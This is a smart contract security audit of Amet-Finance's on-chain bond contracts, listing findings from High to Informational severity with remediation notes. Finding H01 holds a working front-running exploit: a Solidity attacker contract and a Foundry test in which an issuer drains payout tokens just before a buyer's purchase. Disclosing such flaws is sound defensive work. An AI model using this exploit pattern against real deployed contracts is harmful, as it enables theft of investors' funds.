# Smart Contract Security Assessment

Client: Amet-Finance </br>
Solution: Fixed-Flex On-Chain Bonds Contracts </br>
Timeline: 11.03.2024 - 15.03.2024 </br>
Repository: https://github.com/Amet-Finance/contracts/tree/main/contracts/fixed-flex </br>
Commit Id: 1fceca5c4a4687f36673523b22f79fbe2037561c</br>
Remediation Commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb, c1d393aaf70257b297e6a7ccea6a33e221a48452</br>
Size: 339 nSLOC</br>
Documentation: https://docs.amet.finance/v2/references/technical-documentation/smart-contracts/fixed-flex </br>

## Solution

Amet-Finance is a blockchain protocol designed for effectively issuing and managing on-chain bonds. Within the solution, the main functionality allows the issuer to issue bonds in exchange for purchase token (ERC20), and then over time, buyers can redeem bonds in exchange of payout token.

## Scope

- ./contracts/fixed-flex/Bond.sol
- ./contracts/fixed-flex/Issuer.sol
- ./contracts/fixed-flex/Bond.sol
- ./contracts/fixed-flex/interfaces/IBond.sol
- ./contracts/fixed-flex/interfaces/IIssuer.sol
- ./contracts/fixed-flex/interfaces/IVault.sol
- ./contracts/fixed-flex/libraries/helpers/Errors.sol
- ./contracts/fixed-flex/libraries/helpers/Ownership.sol
- ./contracts/fixed-flex/libraries/Types.sol

## Out of scope

- Centralisation concerns.

# Disclaimer

The vulnerabilities identified in the report are based on the tests conducted during the limited period with information provided by the client in advance, whereas a cybercriminal is not limited to such restrictions. Therefore, despite the fact of taking reasonable care to perform the security assessment, this report may not cover all weaknesses existing within the solution.

It is strongly advised to measure the Gas usage after any suggested code change to optimise the Gas spendings. Every piece of code may present unique instance in terms of the context and circumstances where it is processed, thus Gas spendings optimisation may have opposite effect.

# Risk rate methodology

Within the security assessment the qualitative severity raking was used with labels: Critical, High, Medium, Low and Informational. The severity assigned to each finding was assessed based on the auditor's experience and in accordance with the leading security practices.

# Risks

- The issuer must manually transfer purchase tokens into the Bond contract to enable redeem functionality. However, buyers can purchase bonds anytime.
- There is no whitelisting of purchase/payout tokens, thus, issuer can configure Bond to use any kind of ERC20 tokens.
- The solution is meant to be used with ERC20 tokens, excluding so called weird ERC20 such as with inclusive fee-on-transfer or rebasing. The solution provides such off-chain notification, however, there is no relevant input validation implemented to handle this requirement. Thus, users must take extra care of selecting ERC20 tokens that comply with the protocol.

# Findings

## Statistics

| Severity | Critical | High | Medium | Low | Informational |
| - | - | - | - | - | - |
| Number of findings | 0 | 1 | 1 | 2 | 15 |
| Fixed findings | 0 | 0 | 1 | 1 | 9 |
| Mitigated findings | 0 | 1 | 0 | 0 | 0 |
| Accepted findings | 0 | 0 | 0 | 1 | 6 |

## [H01][Mitigated] Bond's owner can steal user deposit by front-running the purchase() function

The solution allows issuer to create a `Bond` instance where investors can invest the `purchaseToken` and redeem later the `payoutToken`. To incentivise investors the issuer must firstly manually transfer an amount of the `payoutToken` into the Bond contract. However, it was identified that malicious investor can front-run investor call to the `purchase()` function and withdraw the `payoutToken` from the contract, stealing the investor's `purchaseToken` provided.

The issuer can update the bonds supply by means of the `updateBondSupply()` function anytime, considering only the condition that new supply must be higher that amount of purchased bonds. The issuer also controls the `isSettled` value.

```solidity
    function updateBondSupply(uint40 totalBonds) external onlyOwner {
        Types.BondLifecycle storage lifecycleTmp = lifecycle;

        if (lifecycleTmp.purchased > totalBonds || (lifecycleTmp.isSettled && totalBonds > lifecycleTmp.totalBonds)) {
            Errors.revertOperation(Errors.Code.ACTION_BLOCKED);
        }

        lifecycleTmp.totalBonds = totalBonds;
        emit UpdateBondSupply(totalBonds);
    }
```

The issuer can withdraw the excess number of payout tokens by means of the `withdrawExcessPayout()` function. The only condition is that there must be enough tokens left in the contract to cover purchased and not yet redeemed bonds. However, this condition can be bypassed by decreasing the bonds supply to 0 or to the number of redeemed bonds. In such case, the issuer can withdraw all remaining tokens transferred previously to the contract.

```solidity

    function withdrawExcessPayout() external onlyOwner nonReentrant {
        Types.BondLifecycle memory lifecycleTmp = lifecycle;
        IERC20 payoutTokenTmp = payoutToken;

        // calculate for purchase but not redeemed bonds + potential purchases
        uint256 totalPayout = (lifecycleTmp.totalBonds - lifecycleTmp.redeemed) * payoutAmount;
        uint256 currentBalance = payoutTokenTmp.balanceOf(address(this));
        if (currentBalance <= totalPayout) Errors.revertOperation(Errors.Code.ACTION_BLOCKED);

        uint256 excessPayout = currentBalance - totalPayout;
        payoutTokenTmp.safeTransfer(owner(), excessPayout);

        emit WithdrawExcessPayout(excessPayout);
    }
```

**Severity**: High

### Proof of Concept:

1. As an owner, deploy and configure the protocol.
2. As an issuer, issue `Bond` instance with incentive parameters.
3. As an issuer, transfer some incentive amount of payout tokens to the `Bond` contract.
4. As a purchaser, attempt to purchase some bonds. Firstly, call the `approve()`/`increaseApproval()` function to initiate the process.
5. As a user, observe the mempool and notice the above transaction, manually or by means of contract trigger such sequence of operations:
- `bond.updateBondSupply(0);`
- `bond.withdrawExcessPayout();`
- `bond.updateBondSupply(100); //or any sufficient amount`
6. Observe the Bond contract state. Note that payout token is withdrawn from the contract.
7. As a purchaser, finish the purchase process by calling the `purchase()` function.
8. Observe the protocol state. Notice that majority of purchase tokens are transferred to the issuer and small part to the `Vault`.

```solidity
contract BondFrontRunner {
    Bond bond;
    Issuer immutable issuer;
    address immutable purchaseToken;
    address immutable payoutToken;

    constructor (
        Issuer _issuer,
        address _purchaseToken, 
        address _payoutToken
    ) public {
        issuer = _issuer;
        purchaseToken = _purchaseToken;
        payoutToken = _payoutToken;
    }

    function setBond(Bond _bond) public { 
        bond = _bond;
    }

    function issue() public payable {
        uint40 totalBonds = 100;
        uint40 maturityInBlocks = 20;
        uint256 purchaseAmount = 10 ** 17;
        uint256 payoutAmount = 1.5 * 10 ** 17;
        issuer.issue{value: msg.value}(totalBonds, maturityInBlocks, address(purchaseToken), purchaseAmount, address(payoutToken), payoutAmount);
    }

    function attack() public {
        bond.updateBondSupply(0);
        bond.withdrawExcessPayout();
        bond.updateBondSupply(100);
    }
}
```

```solidity
function test_issuer_issue_bond_and_frontrun_purchase() public {
    uint256 purchaseAmount = 10 ** 17;
    vm.deal(issuerAccount1, initialIssuanceFee);

    vm.startPrank(issuerAccount1);
    BondFrontRunner bondFrontRunner = new BondFrontRunner(issuer, address(purchaseToken), address(payoutToken));
    Bond bond = Bond(getBondAddress());
    bondFrontRunner.setBond(bond);
    bondFrontRunner.issue{value: initialIssuanceFee}();
    payoutToken.transfer(address(bond), 10 ether); 
    vm.stopPrank();

    vm.prank(user1);
    purchaseToken.approve(address(bond), 50 * purchaseAmount); 

    assertEq(payoutToken.balanceOf(address(bond)), 10 ether);

    vm.prank(issuerAccount1);
    bondFrontRunner.attack();

    assertEq(payoutToken.balanceOf(address(bond)), 0 ether);
    assertEq(payoutToken.balanceOf(address(bondFrontRunner)), 10 ether);

    vm.prank(user1);
    bond.purchase(50, address(0));
}
```

### Recommendations:

It is recommended to adjust the protocol design and business rules to remove the front-run possibility. The vulnerability can be remediated with various approaches:
- Enforce % amount of payout tokens to be held by the `Bond` contract.
- Check the payout tokens balance within the `purchase()` function.
- Add input parameter representing the number of payout tokens to be held by the contract within the `purchase()` call.
- Introduce cooldown period for `Bond` configuration update.

### Remediation:

[Mitigated]: The Client's team plans to incentivise issuers to settle the `Bond` and motivate users to purchase settled bonds. Settled bonds cannot be used in this type of attack as the number of bonds can be decreased but not increased anymore. Also, team plans to implement user interface notification that contract has not sufficient payout token balance before performing purchase operation.

## [M01][Fixed] Referrers fees can be not accessible until settle() is called

Referrers can incentivise from the protocol by receiving fees for referring investors to purchase a bond. In such case the fee is transferred to the `Vault` contract and such information is recorded within the `purchase()` function.

```solidity
    function purchase(uint40 quantity, address referrer) external nonReentrant {
...
        purchaseToken.safeTransferFrom(msg.sender, address(vault), purchaseFee);
...
        vault.recordReferralPurchase(msg.sender, referrer, quantity);
    }
```

To withdraw the fees, referrer must call the `claimReferralRewards()` function. This functions calls the `Bond's` `getSettledPurchaseDetails()` function to verify whether the `Bond` is settled.

```solidity
function claimReferralRewards(address bondAddress) external {
...
    (IERC20 purchaseToken, uint256 purchaseAmount) = bond.getSettledPurchaseDetails();
...
}
```

```solidity
function getSettledPurchaseDetails() external view returns (IERC20, uint256) {
    Types.BondLifecycle memory lifecycleTmp = lifecycle;
    bool isSettledFully = lifecycleTmp.isSettled && lifecycleTmp.totalBonds == lifecycleTmp.purchased; 
    if (!isSettledFully) Errors.revertOperation(Errors.Code.ACTION_BLOCKED);

    return (purchaseToken, purchaseAmount);
}
```

However, there is no need to call the `settle()` function by the issuer. This function call can be omitted and the protocol will still work as expected. Thus, there is a risk that referrers will be not capable to withdraw their fees, unless issuer triggers the `settle()` function.

```solidity
function settle() external onlyOwner {
    Types.BondLifecycle storage lifecycleTmp = lifecycle;

    uint256 totalPayoutRequired = (lifecycleTmp.totalBonds - lifecycleTmp.redeemed) * payoutAmount;

    if (totalPayoutRequired > payoutToken.balanceOf(address(this))) {
        Errors.revertOperation(Errors.Code.INSUFFICIENT_PAYOUT);
    }

    lifecycleTmp.isSettled = true;
    emit SettleContract();
}
```
**Severity**: Medium

### Recommendations:

It is recommended to adjust the protocol design and business rules to allow referrers to withdraw their fees. For example, referrer fee could be accessible after the `Bond` reaches its pre-set maturity level.

### Remediation:

[Fixed, commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb]: The referrer can now withdraw the fees immediately. The protocol design takes into account scenario when single referrer gets multiple fees and withdraw them occasionally.

## [L01][Fixed] Solution lacks two-step ownership transfer

Every solution's contract implements OpenZepplin’s `Ownable` pattern via inheritance of the `Ownership` contract. Contracts owners can configure various protocol settings. The `Ownable` contract lacks the two-step ownership pattern implementation. Thus, accidental transfer of ownership to unverified and incorrect address may result in loss of ownership. In such a case, access to every function protected by the `onlyOwner` modifier will be permanently lost.

**Severity**: Low

### Recommendations:

It is recommended to implement a two-step ownership transfer pattern within the solution, such as OpenZepplin’s `Ownable2Step`.

### Remediation:

[Fixed, commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb]: The solution now uses two-step ownership transfer pattern in every case.

## [L02][Accepted] Vault owner can withdraw referrers fee

The `Vault` owner can withdraw both ether and any ERC20 token transferred to the `Vault` by means of the `withdraw()` function. However, the `Vault` stores referrers fees as well, but there is no accounting for this process performed. Thus, as the amount of referrers fees is unknown, the `Vault` owner can withdraw referrers fees accidentally or on purpose.

```solidity
function withdraw(address token, address toAddress, uint256 amount) external onlyOwner nonReentrant {
    if (token == address(0)) {
        (bool success, ) = toAddress.call{value: amount}("");
        if (!success) Errors.revertOperation(Errors.Code.ACTION_INVALID);
    } else {
        IERC20(token).safeTransfer(toAddress, amount);
    }

    emit FeesWithdrawn(token, toAddress, amount);
}
```

**Severity**: Low

### Recommendations:

It is recommended to track the fee balances of the protocol owner and referrers and use this information to prevent accidental withdrawal of referrers fees.

### Remediation:

[Accepted]: The Client's team is aware of this protocol weakness and will take care of this off-chain.

## [I01][Accepted] The updateIssuanceFee() lacks input validation

The protocol owner can update the bond issuance fee by means of the `updateIssuanceFee()` function. However, this function lacks any input validation such as upper band check. This absence can makes users uncertain what range of fees can be expected in future updates. Single update has no impact on the `purchase()` function, as strict comparison is enforced. The finding is reported as deviation from leading security practices.

```solidity
    function updateIssuanceFee(uint256 fee) external onlyOwner { 
        issuanceFee = fee;
        emit IssuanceFeeChanged(fee);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to implement input validation for the `issuanceFee` state variable enforcing upper and lower bands.

### Remediation:

[Accepted]: The Client's team accepted the finding.

## [I02][Accepted] The _validateBondFeeDetails() lacks equality check within the condition

The protocol owner can update the `purchaseRate` and `referrerRewardRate` state variables by means of the `_validateBondFeeDetails()` function. However, this function only reverts when `referrerRewardRate` is higher than `referrerRewardRate`, but it does not when these parameters are equal. When these two parameters are equal, the protocol owner does not get profits from the protocol usage.

```solidity
    function _validateBondFeeDetails(uint8 purchaseRate, uint8 referrerRewardRate) private pure {
        if (referrerRewardRate > purchaseRate) Errors.revertOperation(Errors.Code.ACTION_BLOCKED);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to adjust comparison check within the aforementioned function to revert when the `referrerRewardRate` is higher than or equal to `referrerRewardRate`.

### Remediation:

[Accepted]: The Client's team accepted the finding. The team considers not-obtaining the fees as valid scenario.

## [I03][Accepted] The purchase() with 0 quantity is possible

The `purchase()` function can be called with the `quantity` input parameter set to 0. Such transaction does not revert and it does not issue bond. The only outcome of such action is that the `uniqueBondIndex` state variable is increased. This has no impact on the on-chain processing, however it might be inconvenient in off-chain processing.

```solidity
    function purchase(uint40 quantity, address referrer) external nonReentrant {
        Types.BondLifecycle storage lifecycleTmp = lifecycle;

        if (lifecycleTmp.purchased + quantity > lifecycleTmp.totalBonds) {
            Errors.revertOperation(Errors.Code.ACTION_INVALID);
        }

        IVault vault = _issuerContract.vault();
        uint8 purchaseRate = vault.getBondFeeDetails(address(this)).purchaseRate;

        uint256 totalAmount = quantity * purchaseAmount;
        uint256 purchaseFee = Math.mulDiv(totalAmount, purchaseRate, _PERCENTAGE_DECIMAL);

        purchaseToken.safeTransferFrom(msg.sender, address(vault), purchaseFee);
        purchaseToken.safeTransferFrom(msg.sender, owner(), totalAmount - purchaseFee);

        lifecycleTmp.purchased += quantity;
        purchaseBlocks[lifecycleTmp.uniqueBondIndex] = block.number;

        _mint(msg.sender, lifecycleTmp.uniqueBondIndex++, quantity, "");
        vault.recordReferralPurchase(msg.sender, referrer, quantity);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to revert the aforementioned function whenever the `quantity` input parameter is set to 0.

### Remediation:

[Accepted]: The Client's team accepted the finding.

## [I04][Fixed] The Issuer's owner can temporarily DoS Bond while updating the Vault

The `Bond` contract saves reference to the `Issuer` for later usage of the `Vault` fees configured by the protocol owner within the `purchase()` and `redeem()` functions.

```solidity
    function purchase(uint40 quantity, address referrer) external nonReentrant {
...
        IVault vault = _issuerContract.vault();
        uint8 purchaseRate = vault.getBondFeeDetails(address(this)).purchaseRate;
...
    }
```

```solidity
    function redeem(uint40[] calldata bondIndexes, uint40 quantity, bool isCapitulation) external nonReentrant {
...
        uint8 earlyRedemptionRate = _issuerContract.vault().getBondFeeDetails(address(this)).earlyRedemptionRate;
...
    }
```

The protocol owner can change the `Vault` instance within the `Issuer` contract by means of the `changeVault()` function. Then, in new instance the `Bond` instance configuration can be updated by means of the `updateBondFeeDetails()` function. This two-step migration has a drawback that the aforementioned functions from the `Bond` contract are temporarily disabled, until owner add `Bond` configuration to the new `Vault` instance.

```solidity
function changeVault(address vaultAddress) external onlyOwner {
    vault = IVault(vaultAddress);
    emit VaultChanged(vaultAddress); 
}
```

```solidity
    function updateBondFeeDetails(address bondAddress, uint8 purchaseRate, uint8 earlyRedemptionRate, uint8 referrerRewardRate) external onlyOwner {

        _validateBondFeeDetails(purchaseRate, referrerRewardRate);
        if (bondAddress == address(0)) {
            initialBondFeeDetails = Types.BondFeeDetails(purchaseRate, earlyRedemptionRate, referrerRewardRate, true);
        } else {
            _bondFeeDetails[bondAddress] = Types.BondFeeDetails(purchaseRate, earlyRedemptionRate, referrerRewardRate, true);
        }

        emit BondFeeDetailsUpdated(bondAddress, purchaseRate, earlyRedemptionRate, referrerRewardRate);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to reconsider the design of the protocol and introduce the single-step migration process that does not affect negatively other protocol's functionalities.

### Remediation:

[Fixed]: The Client's team confirmed that the current protocol design is desired and done on purpose. The two-step appraoch allows to temporarily disable every `Bond` instance which is expected.

## [I05][Fixed] No rounding direction defined for division operations

The protocol makes use of the `mulDiv()` function from the `Math` library in several places. However, it does not specify the rounding direction in any case, which by default is rounding down. The general rule states that rounding should be applied towards 0 when calculation is done against protocol and towards 1 when calculation is done in favour of protocol. Thus, e.g. owner's fee could be calculated with rounding up.

```solidity
function purchase(uint40 quantity, address referrer) external nonReentrant {
...
    uint256 totalAmount = quantity * purchaseAmount;
    uint256 purchaseFee = Math.mulDiv(totalAmount, purchaseRate, _PERCENTAGE_DECIMAL);

    purchaseToken.safeTransferFrom(msg.sender, address(vault), purchaseFee);
    purchaseToken.safeTransferFrom(msg.sender, owner(), totalAmount - purchaseFee);
...
```

**Severity**: Informational

### Recommendations:

It is recommended to review the usage of the `mulDiv()` function and apply appropriate, desired rounding.

### Remediation:

[Fixed]: The Client's team confirmed that default rounding down is expected.

## [I06][Fixed] Solidity version >=0.8.20 might not be supported in all chains due to PUSH0 opcode

The solutions has solidity version locked on the `0.8.24` version.
The Solidity version 0.8.20 employs the recently introduced `PUSH0` opcode in the Shanghai EVM. This opcode might not be universally supported across all blockchain networks and Layer 2 solutions. Thus, as a result, it might be not possible to deploy solution with version >=0.8.20 on some blockchains.

**Severity**: Informational

### Recommendations:

It is recommended to verify whether solution can be deployed on particular blockchain with the Solidity version >=0.8.20. Whenever such deployment is not possible due to lack of `PUSH0` opcode support and lowering the Solidity version is a must, it is strongly advised to review all feature changes and bugfixes in [Solidity releases](https://soliditylang.org/blog/category/releases/). Some changes may have impact on current implementation and may impose a necessity of maintaining another version of solution.

### Remediation:

[Fixed]: The Client's team confirmed that is aware of the issue and in such event plans to compile with EVM Paris.

## [I07][Accepted] Check Effect Interactions pattern violation

It was identified that the `purchase()` and `redeem()` functions violate Check Effect Interactions (CEI) pattern. In both cases the `_mint()` and `_burn()` functions can trigger cross-contract call, which is done before another cross-contracts interactions. Still, the functions are protected by the `nonReentrant` modifier. Within the assessment no reentrancy vulnerability was identified. The finding is reported as a deviation from the leading security practices.

```solidity
function purchase(uint40 quantity, address referrer) external nonReentrant {
...
    _mint(msg.sender, lifecycleTmp.uniqueBondIndex++, quantity, "");
    vault.recordReferralPurchase(msg.sender, referrer, quantity);
}
```

```solidity
function redeem(uint40[] calldata bondIndexes, uint40 quantity, bool isCapitulation) external nonReentrant {
...
        _burn(msg.sender, bondIndex, burnCount);
        quantity -= burnCount;

        if (isCapitulation && !isMature) {
            totalPayout -= _calculateCapitulationPayout(payoutAmountTmp, lifecycle.maturityPeriodInBlocks, burnCount, purchasedBlock, earlyRedemptionRate);
        }

        if (quantity == 0) break;
        unchecked {
            i += 1;
        }
    }

    if (quantity != 0) Errors.revertOperation(Errors.Code.ACTION_INVALID);

    payoutTokenTmp.safeTransfer(msg.sender, totalPayout);
}
```

**Severity**: Informational

### Recommendations:

It is recommended to follow the CEI pattern in every possible case.

### Remediation:

[Accepted]: The Client's team accepted the finding.

## [I08][Fixed] The ADDRESS_INVALID error code is not used

It was identified that the `ADDRESS_INVALID` item from `Code` enum is not used anywhere in the code. Thus it only costs the deployment Gas and increase the byte size of runtime code.

```solidity
    enum Code {
    CONTRACT_PAUSED,
    FEE_INVALID,
    CONTRACT_NOT_INITIATED,
    CALLER_NOT_ISSUER_CONTRACT, 
    ADDRESS_INVALID,
    ACTION_INVALID,
    ACTION_BLOCKED,
    INSUFFICIENT_PAYOUT,
    REDEEM_BEFORE_MATURITY
}
```

**Severity**: Informational

### Recommendations:

It is recommended to remove unused item from the `Code` enum to save some Gas during the deployment and decrease the size of runtime code.

### Remediation:

[Fixed]: The unused item from the `Code` enum is now removed.

## [I09][Accepted] Vault lacks referrer whitelisting

It was identified that security control leveraging blacklisting of referrer addresses is implemented in the `Vault` contract. Blacklisting approach is considered a deviation of security leading practices.

```solidity
    /// @notice Blocks or unblocks an address for referral rewards
    /// @param referrer The address of the referrer to be blocked or unblocked
    /// @param status True to block the address, false to unblock
    function updateRestrictionStatus(address referrer, bool status) external onlyOwner { 
        _restrictedAddresses[referrer] = status;
        emit RestrictionStatusUpdated(referrer, status);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to implement whitelisting instead of blacklisting approach in aforementioned functionality.

### Remediation:

[Accepted]: The Client's team accepted the finding.

## [I10][Accepted] The changePausedState() is prone to human error

The `changePausedState()` function accept any bool value and sets the `isPaused` state variable, thus it is prone to human error. In the event of emergency, the function can be called with incorrect input value to switch the state and it will always succeed giving false impression of successful operation.

```solidity
    function changePausedState(bool pausedState) external onlyOwner {
        isPaused = pausedState;
        emit PauseChanged(isPaused);
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to either split the functionality into two functions with turn on and turn off state, or revert the function if the current state is the same as provided in the input.

### Remediation:

[Accepted]: The Client's team accepted the finding.

## [I11][Fixed] The VaultChanged event does not emit previous vault address

Within the `changeVault()` function the `VaultChanged` event is emitted with only new vault address, but the previous address is not included.

```solidity
    function changeVault(address vaultAddress) external onlyOwner {
        vault = IVault(vaultAddress);
        emit VaultChanged(vaultAddress); 
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to consider adding previous `Vault` instance address into the `VaultChanged` event. This information might be valuable during off-chain processing or during incident investigation.

### Remediation:

[Fixed, commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb]: The `VaultChanged` event now emits the previous `Vault` instance address as well.

## [I12][Fixed] The receive() function is redundant

The `Vault` contract implements the empty `receive()` function, however it is not designed to process the ether, apart from the payable `initializeBond()` function.

```solidity
    /// @notice Receive function to handle direct ether transfers to the contract
    receive() external payable {}
```

**Severity**: Informational

### Recommendations:

It is recommended to remove redundant function to save some Gas during the deployment and decrease the size of runtime code.

### Remediation:

[Fixed, commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb]: The `receive()` function is now removed.

## [I13][Fixed] The claimReferralRewards() could revert earlier to save some Gas

The `claimReferralRewards` function performs various operations before checking all required conditions, such as fetching some data for local variables. Some of operations appear to be redundant calls done before conditions check.

```solidity
    function claimReferralRewards(address bondAddress) external {
        _isAddressUnrestricted(msg.sender);
        Types.ReferrerRecord storage referrer = _referrers[bondAddress][msg.sender];
        Types.BondFeeDetails memory bondFeeDetails = _bondFeeDetails[bondAddress];
        IBond bond = IBond(bondAddress);
        _isBondInitiated(bondFeeDetails);

        if (referrer.isRepaid || referrer.quantity == 0) Errors.revertOperation(Errors.Code.ACTION_BLOCKED);
...
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to reconsider the order of operations within the aforementioned function to save some execution Gas.

### Remediation:

[Fixed, commit Id: 7222b6bfb7b95814d1d5b6b3b614e29b46c19eeb]: The order of operations within the aforementioned function is now optimised to conditionally save some Gas.

## [I14][Fixed] Redundant cross-contract call within the purchase() function

The `purchase()` function performs cross-contract call at the end of processing, however, this call could be prevented, if only the input validation against the `referrer` input parameter would be executed within this function.

```solidity
function purchase(uint40 quantity, address referrer) external nonReentrant {
...
    _mint(msg.sender, lifecycleTmp.uniqueBondIndex++, quantity, "");
    vault.recordReferralPurchase(msg.sender, referrer, quantity);
}
```

```solidity
function recordReferralPurchase(address operator, address referrer, uint40 quantity) external {
    _isBondInitiated(_bondFeeDetails[msg.sender]);
    if (referrer != address(0) && referrer != operator) {
        _referrers[msg.sender][referrer].quantity += quantity;
        emit ReferralRecord(msg.sender, referrer, quantity);
    }
}
```

**Severity**: Informational

### Recommendations:

It is recommended to reconsider the position of the `referrer` input validation among the contracts to prevent redundant cross-contract call and save some execution Gas.

### Remediation:

[Fixed]: The Client's team confirmed that this design is done on purpose. The team have future updates in mind. In such case, it is prefered to have such validation done outside of the `Bond` contract.

## [I15][Fixed] Overflow checks can be used to reduce Gas usage

The solution performs multiple addition and subtraction operations in various places, however, in almost every case it is done with the overflow/underflow protection, despite the fact that overflow is practically not possible.

```solidity
    function purchase(uint40 quantity, address referrer) external nonReentrant {
...
        if (lifecycleTmp.purchased + quantity > lifecycleTmp.totalBonds) {
            Errors.revertOperation(Errors.Code.ACTION_INVALID);
        }
...
        lifecycleTmp.purchased += quantity;
    }
```

**Severity**: Informational

### Recommendations:

It is recommended to consider usage of `unchecked{}` blocks for some arithmetic operations to disable the overflow/underflow protection and save some execution Gas.

### Remediation:

[Fixed, commit Id: c1d393aaf70257b297e6a7ccea6a33e221a48452]: Several instances of addition is now enclosed within the `unchecked{}` block. 
